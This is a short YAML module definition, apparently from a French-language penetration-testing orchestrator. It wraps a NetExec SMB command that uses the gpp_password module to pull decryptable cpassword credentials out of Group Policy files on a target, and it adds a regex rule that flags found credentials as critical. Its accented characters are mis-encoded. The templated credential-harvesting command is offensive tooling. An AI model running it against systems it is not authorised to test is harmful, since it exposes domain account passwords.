id: nxc_gpp_password
name: NetExec GPP Password
category: Exploitation
description: "R√©cup√®re les mots de passe d√©chiffrables (cpassword) dans les fichiers GPO."
checklist_keys: ["gpp_pass"]    # <--- AJOUTER ICI
inputs:
  - name: target
    label: Cible (IP/CIDR)
    placeholder: 10.3.10.11
  - name: username
    label: Utilisateur
    placeholder: guest
  - name: password
    label: Mot de passe
    placeholder: password
command: "nxc smb {{target}} -u '{{username}}' -p '{{password}}' -M gpp_password"

parsing:
  mode: "text"
  rules:
    - name: "Credentials found in gpp_password"
      regex: "Found credentials"
      badge: "üî¥ [CRITIQUE]"